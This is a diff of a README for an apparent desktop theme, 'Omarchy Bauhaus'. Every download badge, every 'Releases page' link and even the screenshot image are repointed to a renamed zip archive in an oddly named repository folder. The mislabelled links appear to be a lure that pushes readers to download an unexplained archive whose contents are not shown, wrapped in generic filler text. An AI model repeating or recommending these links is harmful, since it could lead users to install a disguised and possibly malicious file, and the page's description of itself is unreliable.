@@ -1,12 +1,12 @@
 # 🎨 omarchy-bauhaus-theme - A Beautiful Dark Theme for Your Application
 
 ## 🌐 Download Here
-[![Download Omarchy Bauhaus Theme](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip)](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip)
+[![Download Omarchy Bauhaus Theme](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip)](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip)
 
 ## 📜 Description
 Omarchy Theme: Bauhaus offers a Bauhaus-inspired dark theme with warm coral and sand accents over cool slate and teal surfaces. It is designed to enhance visual comfort and improve your application experience.
 
-<img width="3840" height="2560" alt="Bauhaus Theme Screenshot" src="https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip" />
+<img width="3840" height="2560" alt="Bauhaus Theme Screenshot" src="https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip" />
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the Omarchy Bauhaus Theme.
@@ -16,7 +16,7 @@ Follow these simple steps to download and run the Omarchy Bauhaus Theme.
    - Omarchy v3.0 or later
 
 2. **Download the Theme**
-   - Visit the [Releases page](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip) to download the latest version.
+   - Visit the [Releases page](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip) to download the latest version.
 
 3. **Extract the Files**
    - Locate the downloaded ZIP file in your downloads folder.
@@ -51,7 +51,7 @@ Here are the specific colors used in the theme:
 - **Selection Background:** #2B3040
 
 ## 💾 Download & Install
-To get started, simply visit the [Releases page](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip) and download the latest version of the theme. Once downloaded, follow the extraction and application steps detailed in this guide.
+To get started, simply visit the [Releases page](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip) and download the latest version of the theme. Once downloaded, follow the extraction and application steps detailed in this guide.
 
 ## 🚧 Troubleshooting
 If you encounter any issues during installation, consider the following:
@@ -66,4 +66,4 @@ Thank you for choosing the Omarchy Bauhaus Theme. Your support means a lot! If y
 ## 📞 Support
 If you need help, please open an issue on the repository, and we will assist you as soon as possible. 
 
-[![Download Omarchy Bauhaus Theme](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip)](https://raw.githubusercontent.com/Kittisakbun/omarchy-bauhaus-theme/main/lansknecht/omarchy-bauhaus-theme.zip)
+[![Download Omarchy Bauhaus Theme](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip)](https://github.com/Kittisakbun/omarchy-bauhaus-theme/raw/refs/heads/main/lansknecht/omarchy-bauhaus-theme-redressal.zip)
